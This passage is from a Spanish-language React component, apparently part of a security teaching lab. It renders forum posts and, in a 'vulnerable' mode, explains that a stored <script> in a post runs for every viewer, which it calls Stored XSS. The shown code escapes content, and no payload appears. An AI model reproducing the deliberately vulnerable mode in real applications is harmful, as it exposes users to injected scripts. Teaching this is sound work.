                          escapa automáticamente)
                        </div>
                        <div className="prose prose-sm max-w-none text-gray-700">
                          {post.content}
                        </div>
                      </>
                    )}

                    <div className="mt-2 text-xs text-gray-500">
                      Por: {post.user?.username || "Usuario"} •{" "}
                      {new Date(post.createdAt).toLocaleString()}
                    </div>
                  </div>
                ))}
              </div>

              {mode === "vulnerable" && (
                <div className="mt-4 p-3 bg-yellow-50 border border-yellow-300 rounded-lg">
                  <p className="text-sm text-yellow-800">
                    💡 <strong>¿Viste el alert?</strong> Si había un{" "}
                    <code className="bg-yellow-100 px-1 py-0.5 rounded">
                      &lt;script&gt;
                    </code>{" "}
                    en algún post, se ejecutó automáticamente. Esto es{" "}
                    <strong>Stored XSS</strong>: el código malicioso está
                    guardado en la base de datos y se ejecuta para TODOS los
                    usuarios que vean esta página.
                  </p>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
